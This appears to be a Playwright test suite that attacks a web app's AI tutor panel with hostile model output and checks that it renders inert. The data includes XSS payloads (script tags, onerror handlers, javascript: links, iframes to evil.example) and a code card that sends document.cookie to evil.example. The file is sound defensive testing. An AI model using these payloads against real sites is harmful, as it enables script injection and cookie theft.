// The tutor panel under attack: hostile markdown and HTML in the tutor's own text, a code card whose code tries
// to run arbitrary JavaScript, error storms with Retry while another turn streams, and leaving the page in the
// middle of a stream. The server's fake tutor answers; hostile frames are spliced into its real SSE stream with
// `page.route`, so the client parses exactly what a misbehaving model (or a compromised proxy) could send.
import { expect, type Page, type Route, test } from "@playwright/test";
import { PREFS_KEY, useUiPrefs } from "../../../../../e2e/support/ui.ts";
import { SHOTS, seed } from "./support.ts";

const panel = (page: Page) => page.getByTestId("tutor-chat");
const lastMessage = (page: Page) => panel(page).getByTestId("tutor-message").last();
/**
 * The spliced turn: its stream ends without a terminal frame, so the live turn fails (and keeps its text) while
 * the server, which did finish, adds its own clean entry to the timeline after it.
 */
const splicedTurn = (page: Page) =>
  panel(page).locator('[data-testid="tutor-message"][data-status="error"]').last();

async function openPanel(page: Page, path = "/studio") {
  await useUiPrefs(page, { theme: "paper", motion: "off" });
  await page.addInitScript((key) => {
    const cur = JSON.parse(localStorage.getItem(key) || "{}");
    localStorage.setItem(key, JSON.stringify({ ...cur, tutorOpen: true }));
  }, PREFS_KEY);
  await page.goto(path);
  await expect(page.getByTestId("tutor-status")).toHaveAttribute("data-state", "ready", { timeout: 30_000 });
}

async function send(page: Page, text: string) {
  const box = panel(page).getByTestId("composer");
  await box.fill(text);
  await box.press("Enter");
}

const frame = (type: string, data: unknown) => `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;

/** Replays the server's real stream with `inject` spliced in before its terminal frame (or instead of it). */
async function splice(route: Route, inject: string, dropTerminal = false) {
  const res = await route.fetch();
  const body = await res.text();
  const at = Math.max(body.lastIndexOf("event: done"), body.lastIndexOf("event: error"));
  const head = at >= 0 ? body.slice(0, at) : body;
  const tail = at >= 0 && !dropTerminal ? body.slice(at) : "";
  await route.fulfill({ status: 200, headers: res.headers(), body: head + inject + tail });
}

const HOSTILE = [
  "Plain words first.",
  '<img src=x onerror="window.__pwned=1"> <script>window.__pwned=2</script>',
  "[run me](javascript:window.__pwned=3) [far away](//evil.example/x) [abs](https://evil.example)",
  "![tracker](https://evil.example/p.png) <iframe src=https://evil.example></iframe>",
  '<a href="https://evil.example" onclick="window.__pwned=4">click</a> [[deg:99]] [[rn:<b>]] [[tool:javascript:x]]',
  `${"> ".repeat(60)}deep quote`,
  "```js\nwindow.__pwned=5\n```",
  "_a ".repeat(4000),
  "[a".repeat(4000),
].join("\n\n");

test.describe.configure({ mode: "serial" });

// Other engineers edit the shared tree while this suite runs: Vite's HMR socket must not reload the page mid-test.
test.beforeEach(async ({ page }) => {
  await page.routeWebSocket(/.*/, () => {});
});
// page.route does not see requests a service worker answers.
test.use({ serviceWorkers: "block" });

test.beforeAll(async ({ browser }) => {
  const page = await browser.newPage();
  await seed(page, "after U01.L03");
  await page.close();
});

test("hostile markdown and HTML in the tutor's text render as inert text", async ({ page }) => {
  await openPanel(page);
  await page.route("**/api/tutor/chat", (r) => splice(r, frame("text", { delta: `\n\n${HOSTILE}` }), true));
  const t0 = Date.now();
  await send(page, "Tell me about loops");
  const msg = splicedTurn(page);
  await expect(msg).toBeVisible({ timeout: 30_000 });
  expect(Date.now() - t0).toBeLessThan(20_000);
  await expect(msg).toContainText("Plain words first.");
  await expect(msg).toContainText("<script>");
  await expect(msg).toContainText("<iframe src=https://evil.example></iframe>");
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  // Nothing in the panel can load or navigate off the app.
  expect(await panel(page).locator("img, iframe, script, object, embed").count()).toBe(0);
  const hrefs = await panel(page)
    .locator("a[href]")
    .evaluateAll((as) => as.map((a) => a.getAttribute("href")));
  for (const h of hrefs) expect(h).toMatch(/^\/(?!\/)/);
  // The fenced code is text, not a playable card.
  await expect(msg.getByTestId("code-card")).toHaveCount(0);
  await page.screenshot({ path: `${SHOTS}/tutor-hostile-paper-1440x900.png` });
});

test("a code card that tries to run JavaScript never runs it", async ({ page }) => {
  await openPanel(page);
  const card = (cardId: string, code: string) =>
    frame("card", {
      cardId,
      toolUseId: `tu-${cardId}`,
      kind: "example",
      title: `Card ${cardId}`,
      code,
      explanation: "An example.",
      bars: 4,
      apply: "applicable",
      applyAllowed: true,
      lockedTools: [],
    });
  await page.route("**/api/tutor/chat", (r) =>
    splice(
      r,
      card("evil1", 'window.__pwned = 1;\ndrums: s("bd sd")') +
        card("evil2", 'fetch("https://evil.example/" + document.cookie)\ndrums: s("bd sd")') +
        card("evil3", 'while (true) {}\ndrums: s("bd sd")') +
        card("evil4", 'drums: s("bd sd").fmap(() => (globalThis.__pwned = 4))'),
      true,
    ),
  );
  await send(page, "Show me an example");
  const msg = splicedTurn(page);
  await expect(msg).toBeVisible({ timeout: 30_000 });
  const cards = msg.getByTestId("code-card");
  await expect(cards).toHaveCount(4);
  for (let i = 0; i < 4; i++) {
    const c = cards.nth(i);
    await c.getByRole("button", { name: /^Preview / }).click();
    // The strict tutor-card lint refuses it before anything is evaluated; the page never hangs.
    await expect(c).toContainText("Preview did not play", { timeout: 15_000 });
  }
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  // The page is still responsive (an infinite loop would have frozen it).
  expect(await page.evaluate(() => 1 + 1)).toBe(2);
});

test("an error storm: repeated failures, Retry is held while another turn streams", async ({ page }) => {
  // The page's clock runs as usual; it is only moved past the cool-down below.
  await page.clock.install();
  await openPanel(page);
  for (const kind of ["overloaded", "network", "server"]) {
    await send(page, `#error:${kind}`);
    await expect(lastMessage(page)).toHaveAttribute("data-status", "error", { timeout: 30_000 });
  }
  const failed = panel(page).getByTestId("turn-error");
  await expect(failed).toHaveCount(3);
  // The fake asks for a 20 s pause; then Retry appears. The pause is the panel's own timer (Date.now and a 1-s
  // setTimeout): the page's clock jumps past it instead of waiting it out.
  await page.clock.fastForward(25_000);
  await expect(failed.first().getByRole("button", { name: "Retry" })).toBeVisible({ timeout: 40_000 });
  // A slow turn streams; the failed turns' Retry must wait for it rather than start a second stream.
  await send(page, "#slow tell me something");
  await expect(lastMessage(page)).toHaveAttribute("data-status", "streaming", { timeout: 15_000 });
  const retry = failed.first().getByRole("button", { name: "Retry" });
  await expect(retry).toBeDisabled();
  await panel(page).getByTestId("composer").press("Escape");
  await expect(lastMessage(page)).toHaveAttribute("data-status", "error", { timeout: 15_000 });
  await expect(retry).toBeEnabled();
  // Retry twice in a row: one new turn, not two.
  const before = await panel(page).getByTestId("tutor-message").count();
  await retry.dblclick();
  await expect(lastMessage(page)).toHaveAttribute("data-status", /done|error/, { timeout: 30_000 });
  await expect(panel(page).getByTestId("tutor-message")).toHaveCount(before);
});

test("leaving the page mid-stream keeps one stream and Stop still ends it", async ({ page }) => {
  await openPanel(page);
  let opened = 0;
  page.on("request", (r) => r.url().includes("/api/tutor/") && r.method() === "POST" && opened++);
  await send(page, "#slow keep talking");
  await expect(lastMessage(page)).toHaveAttribute("data-status", "streaming", { timeout: 15_000 });
  await page.getByRole("link", { name: "Toolbox" }).click();
  await expect(page).toHaveURL(/\/toolbox$/);
  await page.getByRole("link", { name: "The Oak" }).click();
  await expect(page).toHaveURL(/\/oak/);
  expect(opened).toBe(1);
  await expect(lastMessage(page)).toHaveAttribute("data-status", "streaming");
  await panel(page).getByTestId("composer").press("Escape");
  await expect(lastMessage(page)).toHaveAttribute("data-status", "error", { timeout: 15_000 });
  await expect(lastMessage(page).getByTestId("turn-error")).toHaveAttribute("data-kind", "aborted");
});
